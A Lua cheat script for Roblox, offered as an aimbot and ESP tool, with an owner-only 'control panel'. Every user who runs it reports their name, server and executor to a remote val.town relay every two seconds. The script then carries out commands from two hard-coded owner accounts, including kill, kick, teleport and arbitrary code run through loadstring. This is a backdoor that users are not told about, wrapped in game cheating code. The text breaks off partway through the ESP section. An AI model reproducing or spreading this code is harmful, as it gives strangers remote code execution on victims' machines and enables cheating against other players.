--[[
    [S] Universal Control + Aimbot v7
    Owners: 1460823186, 7208967899
    Transport: val.town blob storage (universal, no signup wall)
--]]

local OWNERS = { [1460823186] = true, [7208967899] = true }

local RELAY_URL = "https://pagesoftwo--8cf9285cc81611f1a1df1607ee4eb77e.web.val.run"

local Players      = game:GetService("Players")
local RunService   = game:GetService("RunService")
local HttpService  = game:GetService("HttpService")
local TeleportSvc  = game:GetService("TeleportService")
local CoreGui      = game:GetService("CoreGui")
local TweenService = game:GetService("TweenService")
local UIS          = game:GetService("UserInputService")
local Camera       = workspace.CurrentCamera

local LP    = Players.LocalPlayer
local MY_ID = LP.UserId
local IS_OWNER = OWNERS[MY_ID] == true

-- ============================================================
-- HTTP
-- ============================================================
local function httpRequest(opts)
    local ok, res = pcall(function()
        if syn and syn.request then return syn.request(opts)
        elseif http_request then return http_request(opts)
        elseif request then return request(opts)
        else
            local m = opts.Method or "GET"
            if m == "GET" then
                return { Body = HttpService:GetAsync(opts.Url, true, opts.Headers or {}) }
            elseif m == "PUT" then
                return { Body = HttpService:RequestAsync({ Url = opts.Url, Method = "PUT", Body = opts.Body, Headers = opts.Headers or {} }).Body }
            else
                return { Body = HttpService:PostAsync(opts.Url, opts.Body or "", Enum.HttpContentType.ApplicationJson) }
            end
        end
    end)
    if ok then return res end
    return nil
end

local function readState()
    local r = httpRequest({ Url = RELAY_URL, Method = "GET" })
    if not r or not r.Body or #r.Body == 0 then return nil end
    if r.Body:sub(1, 1) ~= "{" then return nil end
    local ok, d = pcall(HttpService.JSONDecode, HttpService, r.Body)
    if ok and type(d) == "table" then return d end
    return nil
end

local function writeState(state)
    return httpRequest({
        Url = RELAY_URL,
        Method = "PUT",
        Body = HttpService:JSONEncode(state),
        Headers = { ["Content-Type"] = "application/json" },
    })
end

local MSG_HANDLERS = {}

-- ============================================================
-- UI helpers
-- ============================================================
local function makeGui(name)
    local g = Instance.new("ScreenGui")
    g.Name = name
    g.ResetOnSpawn = false
    g.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    g.IgnoreGuiInset = true
    if gethui then g.Parent = gethui()
    elseif CoreGui then g.Parent = CoreGui
    else g.Parent = LP:WaitForChild("PlayerGui") end
    return g
end

local function pulseStroke(stroke)
    task.spawn(function()
        local a = Color3.fromRGB(130, 60, 210)
        local b = Color3.fromRGB(210, 110, 255)
        while stroke and stroke.Parent do
            local t1 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = b })
            t1:Play(); t1.Completed:Wait()
            if not stroke.Parent then break end
            local t2 = TweenService:Create(stroke, TweenInfo.new(1.6, Enum.EasingStyle.Sine), { Color = a })
            t2:Play(); t2.Completed:Wait()
        end
    end)
end

local function styleFrame(frame)
    frame.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
    frame.BorderSizePixel = 0
    frame.Active = true
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = frame
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(130, 60, 210); s.Thickness = 1.6; s.Parent = frame
    pulseStroke(s)
    return s
end

local function styleButton(btn)
    btn.BackgroundColor3 = Color3.fromRGB(42, 24, 66)
    btn.BorderSizePixel = 0
    btn.TextColor3 = Color3.fromRGB(235, 220, 255)
    btn.Font = Enum.Font.GothamMedium
    btn.TextSize = 12
    btn.AutoButtonColor = false
    btn.Active = true
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = btn
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(160, 90, 240); s.Thickness = 1; s.Transparency = 0.2; s.Parent = btn
    local g = Instance.new("UIGradient"); g.Color = ColorSequence.new(Color3.fromRGB(70, 40, 105), Color3.fromRGB(34, 18, 54)); g.Rotation = 90; g.Parent = btn
    btn.MouseEnter:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(62, 38, 95) }):Play() end)
    btn.MouseLeave:Connect(function() TweenService:Create(btn, TweenInfo.new(0.12), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play() end)
    btn.MouseButton1Down:Connect(function() TweenService:Create(btn, TweenInfo.new(0.06), { BackgroundColor3 = Color3.fromRGB(110, 60, 170) }):Play() end)
    btn.MouseButton1Up:Connect(function() TweenService:Create(btn, TweenInfo.new(0.14), { BackgroundColor3 = Color3.fromRGB(42, 24, 66) }):Play() end)
end

local function makeBtn(parent, text, x, y, w, h, cb)
    local b = Instance.new("TextButton")
    b.Size = UDim2.new(0, w, 0, h)
    b.Position = UDim2.new(0, x, 0, y)
    b.Text = text
    b.Parent = parent
    styleButton(b)
    b.MouseButton1Click:Connect(cb)
    return b
end

local function makeLabel(parent, text, x, y, w, h, sz, color)
    local l = Instance.new("TextLabel")
    l.Size = UDim2.new(0, w, 0, h)
    l.Position = UDim2.new(0, x, 0, y)
    l.BackgroundTransparency = 1
    l.TextColor3 = color or Color3.fromRGB(225, 210, 245)
    l.Font = Enum.Font.Gotham
    l.TextSize = sz or 12
    l.TextXAlignment = Enum.TextXAlignment.Left
    l.Text = text
    l.Parent = parent
    return l
end

local function makeInput(parent, placeholder, x, y, w, h)
    local t = Instance.new("TextBox")
    t.Size = UDim2.new(0, w, 0, h)
    t.Position = UDim2.new(0, x, 0, y)
    t.BackgroundColor3 = Color3.fromRGB(26, 16, 42)
    t.BorderSizePixel = 0
    t.TextColor3 = Color3.fromRGB(235, 220, 255)
    t.PlaceholderColor3 = Color3.fromRGB(150, 120, 195)
    t.Font = Enum.Font.Gotham
    t.TextSize = 12
    t.PlaceholderText = placeholder
    t.Text = ""
    t.ClearTextOnFocus = false
    t.Active = true
    t.Parent = parent
    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 6); c.Parent = t
    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(140, 70, 220); s.Transparency = 0.35; s.Parent = t
    return t
end

local function makeScrolling(parent, x, y, w, h)
    local s = Instance.new("ScrollingFrame")
    s.Size = UDim2.new(0, w, 0, h)
    s.Position = UDim2.new(0, x, 0, y)
    s.BackgroundTransparency = 1
    s.BorderSizePixel = 0
    s.ScrollBarThickness = 4
    s.ScrollBarImageColor3 = Color3.fromRGB(160, 90, 240)
    s.CanvasSize = UDim2.new(0, 0, 0, 0)
    s.Active = true
    s.Parent = parent
    local l = Instance.new("UIListLayout")
    l.Padding = UDim.new(0, 6)
    l.SortOrder = Enum.SortOrder.LayoutOrder
    l.Parent = s
    return s, l
end

local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging, dragStart, startPos
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            dragStart = input.Position
            startPos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then dragging = false end
            end)
        end
    end)
    UIS.InputChanged:Connect(function(input)
        if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
            local delta = input.Position - dragStart
            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
        end
    end)
end

-- ============================================================
-- Action executor
-- ============================================================
local function executeAction(c)
    local char = LP.Character
    local hrp  = char and char:FindFirstChild("HumanoidRootPart")
    local hum  = char and char:FindFirstChildOfClass("Humanoid")

    if c.action == "freeze" and hrp then hrp.Anchored = true end
    if c.action == "unfreeze" and hrp then hrp.Anchored = false end
    if c.action == "fling" and hrp then hrp.AssemblyLinearVelocity = Vector3.new(1e5, 1e5, 1e5) end
    if c.action == "explode" and hrp then
        local e = Instance.new("Explosion"); e.Position = hrp.Position; e.Parent = workspace
    end
    if c.action == "kill" and hum then hum.Health = 0 end
    if c.action == "reset" and hum then hum.Health = 0 end
    if c.action == "ragdoll" and char then
        for _, j in ipairs(char:GetDescendants()) do
            if j:IsA("Motor6D") then j.Enabled = false end
        end
    end
    if c.action == "bring" and hrp then
        local owner = Players:GetPlayerByUserId(c.from)
        if owner and owner.Character and owner.Character:FindFirstChild("HumanoidRootPart") then
            hrp.CFrame = owner.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 3)
        end
    end
    if c.action == "sound" then
        local s = Instance.new("Sound")
        s.SoundId = "rbxassetid://" .. tostring(c.payload)
        s.Parent = workspace
        s:Play()
        task.delay(6, function() s:Destroy() end)
    end
    if c.action == "message" then
        local g2 = makeGui("[S] msg")
        local box = Instance.new("TextLabel")
        box.Size = UDim2.new(0, 340, 0, 64)
        box.Position = UDim2.new(0.5, -170, 0.12, 0)
        box.BackgroundColor3 = Color3.fromRGB(18, 12, 28)
        box.BorderSizePixel = 0
        box.TextColor3 = Color3.fromRGB(235, 220, 255)
        box.Font = Enum.Font.GothamBold
        box.TextSize = 15
        box.TextWrapped = true
        box.Text = tostring(c.payload or "")
        box.Parent = g2
        local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = box
        local ss = Instance.new("UIStroke"); ss.Color = Color3.fromRGB(180, 90, 240); ss.Parent = box
        task.delay(4, function() g2:Destroy() end)
    end
    if c.action == "kick" then
        pcall(function() LP:Kick(tostring(c.payload ~= "" and c.payload or "Kicked.")) end)
    end
    if c.action == "code" then
        local fn = loadstring or load
        if fn then pcall(function() fn(c.payload)() end) end
    end
end

table.insert(MSG_HANDLERS, executeAction)

-- ============================================================
-- Heartbeat loop
-- ============================================================
task.spawn(function()
    while true do
        pcall(function()
            local state = readState() or { online = {}, cmd = {} }
            state.online = state.online or {}
            state.cmd    = state.cmd    or {}
            state.online[tostring(MY_ID)] = {
                name = LP.Name, job = game.JobId, place = game.PlaceId,
                ts = os.time(),
                exec = (identifyexecutor and identifyexecutor()) or "unknown",
            }
            local myCmds = state.cmd[tostring(MY_ID)] or {}
            state.cmd[tostring(MY_ID)] = {}
            writeState(state)
            for _, c in ipairs(myCmds) do
                for _, h in ipairs(MSG_HANDLERS) do pcall(h, c) end
            end
        end)
        task.wait(2)
    end
end)

-- ============================================================
-- OWNER PANEL
-- ============================================================
if IS_OWNER then
    local ONLINE      = {}
    local HISTORY     = {}
    local FILTER      = { exec = "", place = "" }
    local FOLLOWING   = {}
    local LAST_SYNC   = 0
    local LAST_ERR    = ""

    local gui = makeGui("[S] Control")
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(0, 360, 0, 620)
    frame.Position = UDim2.new(0, 20, 0.1, 0)
    styleFrame(frame)
    frame.Parent = gui

    local header = Instance.new("Frame")
    header.Size = UDim2.new(1, 0, 0, 30)
    header.BackgroundTransparency = 1
    header.Active = true
    header.Parent = frame
    makeDraggable(frame, header)

    makeLabel(header, "CONTROL PANEL", 14, 6, 200, 22, 16)
    local statusLbl = makeLabel(header, "sync: ...", 210, 8, 140, 14, 10, Color3.fromRGB(180, 160, 220))
    statusLbl.TextXAlignment = Enum.TextXAlignment.Right

    local targetLbl = makeLabel(frame, "Target: none", 14, 34, 320, 14)

    local execFilter  = makeInput(frame, "filter executor...", 14, 52, 160, 22)
    local placeFilter = makeInput(frame, "filter place id...", 180, 52, 166, 22)
    execFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.exec = execFilter.Text end)
    placeFilter:GetPropertyChangedSignal("Text"):Connect(function() FILTER.place = placeFilter.Text end)

    local bcast = makeInput(frame, "broadcast message...", 14, 80, 260, 24)
    makeBtn(frame, "Send All", 280, 80, 66, 24, function()
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) then
                local st = readState() or { online = {}, cmd = {} }
                st.cmd = st.cmd or {}
                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = "message", payload = bcast.Text })
                writeState(st)
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> msg all")
    end)

    local function globalAction(label, action, payload)
        for uid, _ in pairs(ONLINE) do
            if tostring(uid) ~= tostring(MY_ID) then
                local st = readState() or { online = {}, cmd = {} }
                st.cmd = st.cmd or {}
                st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
                table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = action, payload = payload or "" })
                writeState(st)
            end
        end
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. label)
    end

    makeBtn(frame, "Freeze All",   14, 112, 78, 24, function() globalAction("freeze all", "freeze") end)
    makeBtn(frame, "Unfreeze All", 96, 112, 78, 24, function() globalAction("unfreeze all", "unfreeze") end)
    makeBtn(frame, "Fling All",   178, 112, 78, 24, function() globalAction("fling all", "fling") end)
    makeBtn(frame, "Explode All", 260, 112, 86, 24, function() globalAction("explode all", "explode") end)

    makeBtn(frame, "Kill All",    14, 140, 78, 22, function() globalAction("kill all", "kill") end)
    makeBtn(frame, "Reset All",   96, 140, 78, 22, function() globalAction("reset all", "reset") end)
    makeBtn(frame, "Ragdoll All", 178, 140, 78, 22, function() globalAction("ragdoll all", "ragdoll") end)
    makeBtn(frame, "Bring All",   260, 140, 86, 22, function() globalAction("bring all", "bring") end)

    makeLabel(frame, "LIVE PLAYERS", 14, 172, 200, 14)

    local scroll, layout = makeScrolling(frame, 14, 190, 332, 330)

    makeLabel(frame, "HISTORY", 14, 528, 100, 14)
    local histLog = Instance.new("TextLabel")
    histLog.Size = UDim2.new(0, 332, 0, 60)
    histLog.Position = UDim2.new(0, 14, 0, 546)
    histLog.BackgroundColor3 = Color3.fromRGB(14, 8, 24)
    histLog.BorderSizePixel = 0
    histLog.TextColor3 = Color3.fromRGB(190, 170, 220)
    histLog.Font = Enum.Font.Code
    histLog.TextSize = 10
    histLog.TextXAlignment = Enum.TextXAlignment.Left
    histLog.TextYAlignment = Enum.TextYAlignment.Top
    histLog.TextWrapped = true
    histLog.Text = ""
    histLog.Parent = frame
    local hc = Instance.new("UICorner"); hc.CornerRadius = UDim.new(0, 6); hc.Parent = histLog
    local hs = Instance.new("UIStroke"); hs.Color = Color3.fromRGB(130, 60, 210); hs.Transparency = 0.4; hs.Parent = histLog

    local function refreshHistory()
        local out = {}
        for i = 1, math.min(5, #HISTORY) do table.insert(out, HISTORY[i]) end
        histLog.Text = table.concat(out, "\n")
    end

    local SOUND_LIST = {
        ["Bruh"]      = "5238402914",
        ["Vine Boom"] = "6236140145",
        ["Fart"]      = "5476441053",
        ["Airhorn"]   = "2942494796",
        ["Taco Bell"] = "5423143811",
    }

    local function cmd(uid, action, payload)
        local st = readState() or { online = {}, cmd = {} }
        st.cmd = st.cmd or {}
        st.cmd[tostring(uid)] = st.cmd[tostring(uid)] or {}
        table.insert(st.cmd[tostring(uid)], { from = MY_ID, action = action, payload = payload or "" })
        writeState(st)
        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> " .. tostring(action) .. " #" .. tostring(uid))
        refreshHistory()
    end

    local function passesFilter(user)
        if FILTER.exec ~= "" and not string.find(string.lower(tostring(user.exec or "")), string.lower(FILTER.exec), 1, true) then return false end
        if FILTER.place ~= "" and not string.find(tostring(user.place or ""), FILTER.place, 1, true) then return false end
        return true
    end

    local function rebuild()
        for _, c in ipairs(scroll:GetChildren()) do
            if c:IsA("Frame") then c:Destroy() end
        end
        local now = os.time()
        local count = 0
        for uid, user in pairs(ONLINE) do
            if now - (user.ts or 0) < 30 and passesFilter(user) then
                count = count + 1
                local card = Instance.new("Frame")
                card.Size = UDim2.new(1, -4, 0, 64)
                card.BackgroundColor3 = Color3.fromRGB(28, 18, 44)
                card.BorderSizePixel = 0
                card.Active = true
                card.Parent = scroll
                local cc = Instance.new("UICorner"); cc.CornerRadius = UDim.new(0, 8); cc.Parent = card
                local cs = Instance.new("UIStroke"); cs.Color = Color3.fromRGB(130, 60, 210); cs.Transparency = 0.4; cs.Parent = card

                local av = Instance.new("Frame")
                av.Size = UDim2.new(0, 44, 0, 44)
                av.Position = UDim2.new(0, 10, 0, 10)
                av.BackgroundColor3 = Color3.fromRGB(48, 28, 72)
                av.BorderSizePixel = 0
                av.Parent = card
                local ac = Instance.new("UICorner"); ac.CornerRadius = UDim.new(0, 6); ac.Parent = av

                makeLabel(card, tostring(user.name), 64, 6, 200, 16, 13)
                makeLabel(card, "#" .. tostring(uid) .. "  " .. tostring(user.exec or "?"), 64, 24, 220, 12, 10)
                makeLabel(card, "hb " .. tostring(math.max(0, now - (user.ts or now))) .. "s", 64, 40, 120, 12, 10)

                local joinBtn = makeBtn(card, "Join", 260, 8, 64, 22, function()
                    pcall(function() TeleportSvc:TeleportToPlaceInstance(user.place or game.PlaceId, user.job, LP) end)
                end)
                joinBtn.Visible = false

                local expandBtn = makeBtn(card, "...", 260, 34, 64, 22, function() end)

                local expanded, panel = false, nil
                expandBtn.MouseButton1Click:Connect(function()
                    targetLbl.Text = "Target: " .. tostring(user.name)
                    if expanded then
                        if panel then panel:Destroy() end
                        expanded = false
                        card.Size = UDim2.new(1, -4, 0, 64)
                        joinBtn.Visible = false
                        return
                    end
                    expanded = true
                    joinBtn.Visible = true
                    panel = Instance.new("Frame")
                    panel.Size = UDim2.new(1, -8, 0, 300)
                    panel.Position = UDim2.new(0, 4, 0, 68)
                    panel.BackgroundTransparency = 1
                    panel.Active = true
                    panel.Parent = card
                    card.Size = UDim2.new(1, -4, 0, 376)

                    local function pb(label, x, y, w, cb) makeBtn(panel, label, x, y, w, 22, cb) end

                    pb("Bring",   0, 0, 104, function() cmd(uid, "bring") end)
                    pb("Fling",   108, 0, 104, function() cmd(uid, "fling") end)
                    pb("Freeze",  216, 0, 100, function() cmd(uid, "freeze") end)

                    pb("Unfreeze",0, 26, 104, function() cmd(uid, "unfreeze") end)
                    pb("Explode", 108, 26, 104, function() cmd(uid, "explode") end)
                    pb("Kill",    216, 26, 100, function() cmd(uid, "kill") end)

                    pb("Ragdoll", 0, 52, 104, function() cmd(uid, "ragdoll") end)
                    pb("Reset",   108, 52, 104, function() cmd(uid, "reset") end)
                    pb("Follow",  216, 52, 100, function()
                        FOLLOWING[uid] = not FOLLOWING[uid]
                        table.insert(HISTORY, 1, os.date("%H:%M:%S") .. " -> follow " .. tostring(FOLLOWING[uid]) .. " #" .. tostring(uid))
                        refreshHistory()
                    end)

                    local msgIn = makeInput(panel, "message...", 0, 80, 216, 22)
                    pb("Send", 220, 80, 96, function() cmd(uid, "message", msgIn.Text) end)

                    local snd = Instance.new("TextButton")
                    snd.Size = UDim2.new(0, 316, 0, 22)
                    snd.Position = UDim2.new(0, 0, 0, 108)
                    snd.Text = "sound: tap to cycle"
                    snd.Parent = panel
                    styleButton(snd)
                    local soundKeys = {}
                    for k, _ in pairs(SOUND_LIST) do table.insert(soundKeys, k) end
                    local soundIdx = 1
                    snd.MouseButton1Click:Connect(function()
                        soundIdx = soundIdx % #soundKeys + 1
                        snd.Text = "sound: " .. soundKeys[soundIdx]
                        cmd(uid, "sound", SOUND_LIST[soundKeys[soundIdx]])
                    end)

                    local codeIn = makeInput(panel, 'print("hi")', 0, 136, 316, 40)
                    codeIn.Font = Enum.Font.Code
                    pb("Run Code", 0, 180, 316, 22, function() cmd(uid, "code", codeIn.Text) end)

                    makeLabel(panel, "kick message:", 0, 208, 200, 14, 10)
                    local kickIn = makeInput(panel, "jump if u want to get banned", 0, 224, 316, 22)
                    pb("Kick", 0, 252, 316, 22, function() cmd(uid, "kick", kickIn.Text) end)
                end)
            end
        end
        scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 8)
        if count == 0 then
            local empty = Instance.new("Frame")
            empty.Size = UDim2.new(1, -4, 0, 30)
            empty.BackgroundTransparency = 1
            empty.Parent = scroll
            makeLabel(empty, "no clients online...", 4, 6, 300, 18, 12, Color3.fromRGB(160, 140, 190))
        end
    end

    refreshHistory()
    rebuild()

    task.spawn(function()
        while true do
            pcall(function()
                local st = readState()
                if st and st.online then
                    ONLINE = st.online
                    LAST_SYNC = os.time()
                    LAST_ERR = ""
                else
                    LAST_ERR = "read failed"
                end
            end)
            rebuild()
            task.wait(2)
        end
    end)

    task.spawn(function()
        while task.wait(3) do
            for uid, on in pairs(FOLLOWING) do
                if on and ONLINE[uid] then
                    local u = ONLINE[uid]
                    if u.job and u.job ~= game.JobId then
                        pcall(function() TeleportSvc:TeleportToPlaceInstance(u.place or game.PlaceId, u.job, LP) end)
                    end
                end
            end
        end
    end)

    task.spawn(function()
        while true do
            local now = os.time()
            if LAST_ERR ~= "" then
                statusLbl.Text = LAST_ERR
                statusLbl.TextColor3 = Color3.fromRGB(230, 120, 120)
            elseif LAST_SYNC == 0 then
                statusLbl.Text = "syncing..."
                statusLbl.TextColor3 = Color3.fromRGB(230, 200, 120)
            elseif now - LAST_SYNC < 8 then
                statusLbl.Text = "sync: live"
                statusLbl.TextColor3 = Color3.fromRGB(140, 230, 140)
            else
                statusLbl.Text = "sync: " .. (now - LAST_SYNC) .. "s ago"
                statusLbl.TextColor3 = Color3.fromRGB(230, 190, 120)
            end
            task.wait(1)
        end
    end)

    return
end

-- ============================================================
-- USER PANEL
-- ============================================================
local gui = makeGui("[S] Universal")
local main = Instance.new("Frame")
main.Size = UDim2.new(0, 260, 0, 460)
main.Position = UDim2.new(0, 20, 0.2, 0)
styleFrame(main)
main.Parent = gui

local uHeader = Instance.new("Frame")
uHeader.Size = UDim2.new(1, 0, 0, 30)
uHeader.BackgroundTransparency = 1
uHeader.Active = true
uHeader.Parent = main
makeDraggable(main, uHeader)

makeLabel(uHeader, "[S] UNIVERSAL", 12, 6, 200, 20, 15)

local CFG = {
    aim = false, fov = 150, smooth = 0.35, bone = "Head",
    team = true, vis = false, trig = false,
    espBox = true, espName = true, espHP = true, espDist = true, espSkel = false, chams = false,
    fovCircle = true,
}

local boneList = { "Head", "UpperTorso", "LowerTorso", "HumanoidRootPart" }
local boneIdx = 1
CFG.bone = boneList[boneIdx]

makeLabel(main, "AIMBOT", 12, 34, 100, 14, 11)
local aimBtn = makeBtn(main, "Aimbot: OFF", 12, 50, 236, 24, function(self)
    CFG.aim = not CFG.aim
    self.Text = "Aimbot: " .. (CFG.aim and "ON" or "OFF")
end)

local fovLbl = makeLabel(main, "FOV: 150", 12, 78, 120, 14, 11)
local fovBar = Instance.new("Frame")
fovBar.Size = UDim2.new(0, 236, 0, 6)
fovBar.Position = UDim2.new(0, 12, 0, 94)
fovBar.BackgroundColor3 = Color3.fromRGB(34, 22, 50)
fovBar.BorderSizePixel = 0
fovBar.Active = true
fovBar.Parent = main
local fbc = Instance.new("UICorner"); fbc.CornerRadius = UDim.new(1, 0); fbc.Parent = fovBar
local fovFill = Instance.new("Frame")
fovFill.Size = UDim2.new(CFG.fov / 400, 0, 1, 0)
fovFill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
fovFill.BorderSizePixel = 0
fovFill.Parent = fovBar
local ffc = Instance.new("UICorner"); ffc.CornerRadius = UDim.new(1, 0); ffc.Parent = fovFill

local fovDrag = false
fovBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then fovDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if fovDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - fovBar.AbsolutePosition.X) / fovBar.AbsoluteSize.X, 0, 1)
        CFG.fov = math.floor(rel * 400)
        fovFill.Size = UDim2.new(rel, 0, 1, 0)
        fovLbl.Text = "FOV: " .. CFG.fov
    end
end)

local smoothLbl = makeLabel(main, "Smooth: 0.35", 12, 106, 120, 14, 11)
local smoothBar = Instance.new("Frame")
smoothBar.Size = UDim2.new(0, 236, 0, 6)
smoothBar.Position = UDim2.new(0, 12, 0, 122)
smoothBar.BackgroundColor3 = Color3.fromRGB(34, 22, 50)
smoothBar.BorderSizePixel = 0
smoothBar.Active = true
smoothBar.Parent = main
local sbc = Instance.new("UICorner"); sbc.CornerRadius = UDim.new(1, 0); sbc.Parent = smoothBar
local smoothFill = Instance.new("Frame")
smoothFill.Size = UDim2.new(CFG.smooth, 0, 1, 0)
smoothFill.BackgroundColor3 = Color3.fromRGB(180, 100, 255)
smoothFill.BorderSizePixel = 0
smoothFill.Parent = smoothBar
local sfc = Instance.new("UICorner"); sfc.CornerRadius = UDim.new(1, 0); sfc.Parent = smoothFill

local smoothDrag = false
smoothBar.InputBegan:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = true end
end)
UIS.InputEnded:Connect(function(i)
    if i.UserInputType == Enum.UserInputType.MouseButton1 then smoothDrag = false end
end)
UIS.InputChanged:Connect(function(i)
    if smoothDrag and i.UserInputType == Enum.UserInputType.MouseMovement then
        local mx = UIS:GetMouseLocation().X
        local rel = math.clamp((mx - smoothBar.AbsolutePosition.X) / smoothBar.AbsoluteSize.X, 0.01, 1)
        CFG.smooth = math.floor(rel * 100) / 100
        smoothFill.Size = UDim2.new(rel, 0, 1, 0)
        smoothLbl.Text = "Smooth: " .. CFG.smooth
    end
end)

makeBtn(main, "Bone: Head", 12, 136, 236, 24, function(self)
    boneIdx = boneIdx % #boneList + 1
    CFG.bone = boneList[boneIdx]
    self.Text = "Bone: " .. CFG.bone
end)

makeBtn(main, "Team Check: ON", 12, 166, 116, 22, function(self) CFG.team = not CFG.team; self.Text = "Team Check: " .. (CFG.team and "ON" or "OFF") end)
makeBtn(main, "Vis Check: OFF", 132, 166, 116, 22, function(self) CFG.vis = not CFG.vis; self.Text = "Vis Check: " .. (CFG.vis and "ON" or "OFF") end)
makeBtn(main, "Triggerbot: OFF", 12, 192, 236, 22, function(self) CFG.trig = not CFG.trig; self.Text = "Triggerbot: " .. (CFG.trig and "ON" or "OFF") end)

makeLabel(main, "ESP", 12, 220, 100, 14, 11)
makeBtn(main, "Box: ON",      12, 236, 116, 22, function(self) CFG.espBox  = not CFG.espBox;  self.Text = "Box: "   .. (CFG.espBox  and "ON" or "OFF") end)
makeBtn(main, "Name: ON",     132, 236, 116, 22, function(self) CFG.espName = not CFG.espName; self.Text = "Name: "  .. (CFG.espName and "ON" or "OFF") end)
makeBtn(main, "Health: ON",   12, 262, 116, 22, function(self) CFG.espHP   = not CFG.espHP;   self.Text = "Health: ".. (CFG.espHP   and "ON" or "OFF") end)
makeBtn(main, "Dist: ON",     132, 262, 116, 22, function(self) CFG.espDist = not CFG.espDist; self.Text = "Dist: "  .. (CFG.espDist and "ON" or "OFF") end)
makeBtn(main, "Skeleton: OFF",12, 288, 116, 22, function(self) CFG.espSkel = not CFG.espSkel; self.Text = "Skeleton: " .. (CFG.espSkel and "ON" or "OFF") end)
makeBtn(main, "Chams: OFF",   132, 288, 116, 22, function(self) CFG.chams   = not CFG.chams;   self.Text = "Chams: " .. (CFG.chams and "ON" or "OFF") end)

makeBtn(main, "FOV Circle: ON", 12, 314, 236, 22, function(self)
    CFG.fovCircle = not CFG.fovCircle
    self.Text = "FOV Circle: " .. (CFG.fovCircle and "ON" or "OFF")
    fovCircle.Visible = CFG.fovCircle
end)

makeLabel(main, "R = toggle aim   F = toggle esp", 12, 342, 236, 14, 10)
makeLabel(main, "transport: val.town", 12, 358, 236, 14, 10)

local fovCircle = Instance.new("Frame")
fovCircle.AnchorPoint = Vector2.new(0.5, 0.5)
fovCircle.Size = UDim2.new(0, CFG.fov * 2, 0, CFG.fov * 2)
fovCircle.BackgroundTransparency = 1
fovCircle.BorderSizePixel = 0
fovCircle.Parent = gui
local fstroke = Instance.new("UIStroke")
fstroke.Color = Color3.fromRGB(190, 100, 255)
fstroke.Thickness = 1
fstroke.Parent = fovCircle
local fcorner = Instance.new("UICorner"); fcorner.CornerRadius = UDim.new(1, 0); fcorner.Parent = fovCircle
pulseStroke(fstroke)

local esp = {}

local function buildEsp(plr)
    if plr == LP then return end
    if esp[plr] then
        for _, o in pairs(esp[plr]) do pcall(function() o:Destroy() end) end
    end
    local bucket = {}
    if not plr.Character then esp[plr] = bucket; return end

    local box = Instance.new("BoxHandleAdornment")
    box.Adornee = plr.Character
    box.AlwaysOnTop = true
    box.Size = Vector3.new(2.2, 2.6, 1.2)
    box.Transparency = 0.5
    box.Color3 = Color3.fromRGB(190, 100, 255)
    box.Visible = CFG.espBox
    box.Parent = gui
    bucket.box = box

    local bill = Instance.new("BillboardGui")
    bill.Size = UDim2.new(0, 140, 0, 44)
    bill.StudsOffset = Vector3.new(0, 3.2, 0)
    bill.AlwaysOnTop = true
    bill.Adornee = plr.Character
    bill.Parent = gui
    bucket.bill = bill

    local nameL = Instance.new("TextLabel")
    nameL.BackgroundTransparency = 1
    nameL.Size = UDim2.new(1, 0, 0, 16)
    nameL.TextColor3 = Color3.fromRGB(235, 220, 255)
    nameL.Font = Enum.Font.GothamBold
    nameL.TextSize = 12
    nameL.TextStrokeTransparency = 0
    nameL.Text = plr.Name
    nameL.Parent = bill
    bucket.nameL = nameL

    local hpL = Instance.new("TextLabel")
    hpL.BackgroundTransparency = 1
    hpL.Size = UDim2.new(1, 0, 0, 14)
    hpL.Position = UDim2.new(0, 0, 0, 16)
    hpL.TextColor3 = Color3.fromRGB(255, 180, 180)
    hpL.Font = Enum.Font.Gotham
    hpL.TextSize = 11
    hpL.TextStrokeTransparency = 0
    hpL.Text = "100"
    hpL.Parent = bill
    bucket.hpL = hpL

    local distL = Instance.new("TextLabel")
    distL.BackgroundTransparency = 1
    distL.Size = UDim2.new(1, 0, 0, 14)
    distL.Position = UDim2.new(0, 0, 0, 30)
    distL.TextColor3 = Color3.fromRGB(210, 200, 240)
    distL.Font = Enum.Font.Gotham
    distL.TextSize = 11
